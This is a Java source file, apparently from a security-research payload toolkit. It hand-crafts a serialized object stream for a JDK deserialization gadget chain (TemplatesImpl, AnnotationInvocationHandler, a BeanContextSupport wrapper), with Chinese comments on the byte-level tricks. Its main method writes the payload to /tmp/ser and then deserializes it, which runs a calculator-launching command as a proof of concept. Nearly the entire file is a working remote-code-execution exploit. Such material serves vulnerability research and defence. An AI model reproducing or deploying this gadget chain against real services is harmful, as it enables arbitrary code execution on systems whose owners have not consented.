package util.n1nty.testpayload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import util.Gadgets;
import util.Reflections;
import util.n1nty.gen.*;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextChild;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

import static java.io.ObjectStreamConstants.SC_SERIALIZABLE;
import static java.io.ObjectStreamConstants.SC_WRITE_METHOD;

public class TestRCE {

    public static Templates makeTemplates(String command) {
        TemplatesImpl templates = null;
        try {
            templates =  Gadgets.createTemplatesImpl(command);
            Reflections.setFieldValue(templates, "_auxClasses", null);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return templates;
    }

    public static TCObject makeHandler(HashMap map, Serialization ser) throws Exception {
        TCObject handler = new TCObject(ser) {
            @Override
            public void doWrite(DataOutputStream out, HandleContainer handles) throws Exception {
                ByteArrayOutputStream byteout = new ByteArrayOutputStream();
                super.doWrite(new DataOutputStream(byteout), handles);
                byte[] bytes = byteout.toByteArray();

                /**
                 * 去掉最后的 TC_ENDBLOCKDATA 字节。因为在反序列化 annotation invocation handler 的过程中会出现异常导致序列化的过程不能正常结束
                 * 从而导致 TC_ENDBLOCKDATA 这个字节不能被正常吃掉
                 * 我们就不能生成这个字节
                 * */
                out.write(bytes, 0, bytes.length -1);
            }
        };

        // 手动添加  SC_WRITE_METHOD，否则会因为反序列化过程中的异常导致 ois.defaultDataEnd 为 true，导致流不可用。
        TCClassDesc desc = new TCClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", (byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
        desc.addField(new TCClassDesc.Field("memberValues", Map.class));
        desc.addField(new TCClassDesc.Field("type", Class.class));

        TCObject.ObjectData data = new TCObject.ObjectData();
        data.addData(map);
        data.addData(Templates.class);

        handler.addClassDescData(desc, data);

        return handler;
    }

    public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception {
        TCObject obj = new TCObject(ser);

        TCClassDesc beanContextSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
        TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");

        beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
        TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
        beanContextSupportData.addData(1); // serializable


        beanContextSupportData.addData(handler);
        beanContextSupportData.addData(0, true); // 防止 deserialize 内再执行 readObject


        beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
        TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
        beanContextChildSupportData.addData(obj); // 指回被序列化的 BeanContextSupport 对象

        obj.addClassDescData(beanContextSupportDesc, beanContextSupportData, true);
        obj.addClassDescData(beanContextChildSupportDesc, beanContextChildSupportData);

        return obj;
    }

    public static void main(String[] args) throws Exception {

        Serialization ser = new Serialization();
        Templates templates = makeTemplates("open /Applications/Calculator.app");

        HashMap map = new HashMap();
        map.put("f5a5a608", templates);

        TCObject handler = makeHandler(map, ser);


        TCObject linkedHashset = new TCObject(ser);
        TCClassDesc linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
        TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();


        TCClassDesc hashsetDesc = new TCClassDesc("java.util.HashSet");
        hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class)); // 假属性要加在 HashSet 里面而不是 LinkedHashSet 里面，因为父类的数据会先被写入，读到的时候也先被读取。
        TCObject.ObjectData hashsetData = new TCObject.ObjectData();
        hashsetData.addData(makeBeanContextSupport(handler, ser));
        hashsetData.addData(10, true); // capacity
        hashsetData.addData(1.0f, true); // loadFactor
        hashsetData.addData(2, true); // size


        hashsetData.addData(templates);


        TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
        hashsetData.addData(proxy);


        linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
        linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);

        ser.addObject(linkedHashset);
        ser.write("/tmp/ser");

        ObjectInputStream in = new ObjectInputStream(new FileInputStream(new File("/tmp/ser")));

        System.out.println(in.readObject());
    }
}
